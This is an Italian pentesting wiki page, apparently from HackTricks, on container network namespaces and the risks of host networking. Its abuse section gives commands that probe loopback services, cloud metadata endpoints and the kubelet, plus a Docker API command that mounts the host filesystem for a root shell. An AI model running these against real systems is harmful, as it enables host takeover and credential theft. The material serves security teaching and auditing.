# Namespace di rete

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace di rete isola le risorse correlate alla rete come interfacce, indirizzi IP, tabelle di routing, stato ARP/neighbor, regole firewall, socket e il contenuto di file come `/proc/net`. Per questo un container può avere quello che sembra il proprio `eth0`, le proprie rotte locali e il proprio dispositivo loopback senza possedere lo stack di rete reale dell'host.

Dal punto di vista della sicurezza, questo è importante perché l'isolamento di rete riguarda molto più del semplice port binding. Un namespace di rete privato limita ciò che il workload può osservare o riconfigurare direttamente. Una volta che quel namespace viene condiviso con l'host, il container può improvvisamente ottenere visibilità sui listener dell'host, sui servizi host-local e sui punti di controllo di rete che non erano stati pensati per essere esposti all'applicazione.

## Funzionamento

Un namespace di rete appena creato inizia con un ambiente di rete vuoto o quasi vuoto finché non gli vengono collegate delle interfacce. I container runtimes poi creano o connettono interfacce virtuali, assegnano indirizzi e configurano le rotte in modo che il workload abbia la connettività prevista. In deployment basati su bridge, questo di solito significa che il container vede un'interfaccia backed da veth connessa a un bridge dell'host. In Kubernetes, i plugin CNI gestiscono la configurazione equivalente per il networking dei Pod.

Questa architettura spiega perché `--network=host` o `hostNetwork: true` rappresentano un cambiamento così drastico. Invece di ricevere uno stack di rete privato predisposto, il workload si unisce a quello reale dell'host.

## Laboratorio

Puoi vedere un namespace di rete quasi vuoto con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E puoi confrontare i container normali e quelli con rete host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Il host-networked container non ha più la propria vista isolata di socket e interfacce. Questo cambiamento da solo è già significativo ancor prima di chiedersi quali capability abbia il processo.

## Utilizzo a runtime

Docker e Podman normalmente creano un network namespace privato per ogni container salvo diversa configurazione. Kubernetes solitamente assegna a ogni Pod il proprio network namespace, condiviso tra i container all'interno di quel Pod ma separato dall'host. I sistemi Incus/LXC forniscono anch'essi isolamento basato su network namespace, spesso con una più ampia varietà di configurazioni di virtual networking.

Il principio comune è che la rete privata è il confine di isolamento predefinito, mentre il networking dell'host è una scelta esplicita per uscire da quel confine.

## Misconfigurazioni

La misconfigurazione più importante è semplicemente la condivisione del network namespace dell'host. Questo viene fatto talvolta per prestazioni, monitoraggio low-level o comodità, ma rimuove uno dei confini più netti disponibili per i container. I listener locali sull'host diventano raggiungibili in modo più diretto, i servizi bindati a localhost possono diventare accessibili, e capability come `CAP_NET_ADMIN` o `CAP_NET_RAW` diventano molto più pericolose perché le operazioni che abilitano vengono ora applicate all'ambiente di rete dell'host.

Un altro problema è la concessione eccessiva di capability relative alla rete anche quando il network namespace è privato. Un namespace privato aiuta, ma non rende innocui i raw sockets o il controllo di rete avanzato.

## Abuso

In ambienti debolmente isolati, gli attaccanti possono ispezionare i servizi in ascolto sull'host, raggiungere endpoint di management legati solo al loopback, sniffare o interferire con il traffico a seconda delle capability e dell'ambiente, o riconfigurare routing e stato del firewall se è presente `CAP_NET_ADMIN`. In un cluster, questo può anche facilitare movimenti laterali e ricognizione del control plane.

Se sospetti host networking, inizia confermando che le interfacce e i listener visibili appartengano all'host piuttosto che a una rete container isolata:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
I servizi accessibili solo tramite loopback sono spesso la prima scoperta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se sono presenti network capabilities, verificare se il workload può ispezionare o alterare lo stack visibile:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
In ambienti cluster o cloud, host networking giustifica anche una rapida local recon di metadata e dei servizi adiacenti al control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Esempio completo: Host Networking + Accesso al runtime locale / Kubelet

Host networking non fornisce automaticamente il root dell'host, ma spesso espone servizi intenzionalmente raggiungibili solo dal nodo stesso. Se uno di questi servizi è debolmente protetto, host networking diventa una via diretta di escalation dei privilegi.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet su localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impatto:

- compromissione diretta dell'host se un'API runtime locale è esposta senza adeguata protezione
- ricognizione del cluster o movimento laterale se kubelet o agenti locali sono raggiungibili
- manipolazione del traffico o negazione del servizio quando combinato con `CAP_NET_ADMIN`

## Verifiche

L'obiettivo di queste verifiche è capire se il processo ha uno stack di rete privato, quali route e listener sono visibili e se la vista di rete assomiglia già a quella dell'host prima ancora di testare le capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Se l'identificatore del namespace o l'insieme di interfacce visibili somiglia all'host, potrebbe essere già in uso il network dell'host.
- `ss -lntup` è particolarmente utile perché rivela listener limitati al loopback e endpoint di gestione locali.
- Rotte, nomi delle interfacce e il contesto del firewall diventano molto più importanti se sono presenti `CAP_NET_ADMIN` o `CAP_NET_RAW`.

Quando si esamina un container, valuta sempre il network namespace insieme all'insieme di capability. Il network dell'host unito a forti capability di rete è una postura molto diversa rispetto al networking tramite bridge con un set di capability predefinito ristretto.
